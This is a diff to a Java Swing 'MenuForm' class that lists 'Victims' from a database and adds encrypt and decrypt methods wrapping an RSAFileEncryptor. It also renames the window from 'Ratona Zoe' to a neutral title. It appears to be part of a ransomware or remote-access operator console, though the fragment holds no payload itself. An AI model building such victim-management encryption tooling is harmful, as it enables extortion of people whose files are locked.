@@ -1,11 +1,13 @@
 package forms;
 
 import backend.DbConnection;
+import backend.RSAFileEncryptor;
 import backend.Victim;
 
 import javax.swing.*;
 import java.awt.event.ActionEvent;
 import java.awt.event.ActionListener;
+import java.io.File;
 import java.util.ArrayList;
 
 public class MenuForm extends JFrame{
@@ -19,8 +21,10 @@ public class MenuForm extends JFrame{
 
     private DbConnection dbConnection;
 
+    private RSAFileEncryptor rsaFileEncryptor;
+
     public MenuForm(DbConnection dbConnection){
-        super("Ratona Zoe");
+        super("Menu Form");
 
         setContentPane(panel);
         setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
@@ -75,6 +79,21 @@ public class MenuForm extends JFrame{
 
     public ArrayList<Victim> getVictims() {
         return dbConnection.getVictims();
+    }
+
+    public boolean encrypt (File file) {
+        if (rsaFileEncryptor == null) {
+            rsaFileEncryptor = new RSAFileEncryptor();
+        }
+
+        return  rsaFileEncryptor.encrypt(file);
+    }
+
+    public boolean decrypt (File file) {
+        if (rsaFileEncryptor == null) {
+            rsaFileEncryptor = new RSAFileEncryptor();
+        }
+        return rsaFileEncryptor.decrypt(file);
     }
 
 }
